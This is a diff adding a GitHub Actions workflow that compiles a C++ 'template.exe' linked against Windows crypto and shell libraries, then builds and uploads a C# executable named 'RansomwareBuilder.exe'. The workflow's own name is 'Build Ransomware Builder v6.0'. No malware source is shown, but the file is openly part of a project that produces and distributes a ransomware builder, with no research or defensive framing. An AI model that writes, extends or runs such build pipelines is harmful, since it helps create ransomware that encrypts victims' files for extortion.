@@ -1,0 +1,40 @@
+name: Build Ransomware Builder v6.0
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    
+    # ========== СБОРКА ШАБЛОНА (C++) ==========
+    - name: Setup MSVC
+      uses: ilammy/msvc-dev-cmd@v1
+    
+    - name: Build Template
+      run: |
+        cl /O2 /MT /EHsc /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib
+        dir template.exe
+    
+    # ========== СБОРКА БИЛДЕРА (C#) ==========
+    - name: Setup .NET
+      uses: actions/setup-dotnet@v4
+      with:
+        dotnet-version: '4.8.x'
+    
+    - name: Build Builder
+      run: |
+        dotnet build builder.csproj --configuration Release
+        dir bin/Release/net48/RansomwareBuilder.exe
+    
+    - name: Upload Builder EXE
+      uses: actions/upload-artifact@v4
+      with:
+        name: RansomwareBuilder_v6
+        path: bin/Release/net48/RansomwareBuilder.exe
